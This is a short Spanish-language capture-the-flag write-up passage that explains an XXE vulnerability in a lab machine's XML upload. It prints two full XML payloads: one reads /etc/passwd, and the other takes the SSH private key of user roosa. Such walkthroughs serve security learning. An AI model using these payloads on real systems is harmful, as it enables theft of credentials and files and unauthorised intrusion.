## Evaluacion de vulnerabilidades {-}

### XXE {-}

Si la web nos reporta el contenido de un campo XML, los attackantes pueden approvechar de una *ENTITY* para remplazar el campo reportado
por el contenido de un fichero interno de la maquina.

En este caso, vemos que el campo **Author** esta reportado en la web y le indicamos que queremos ver el contenido del `/etc/passwd` en su lugar.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Uploadeamos el fichero y si vamos en `http://10.10.10.91:5000/upload/nombre-del-fichero.xml` vemos que podemos ver el contenido del `/etc/passwd` de la 
maquina.

Como hemos visto que havia un usuario llamado **roosa**, intentamos ver si tiene un fichero `id_rsa`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Despues de subir este nuevo fichero podemos ver la id_rsa del usuario roosa.



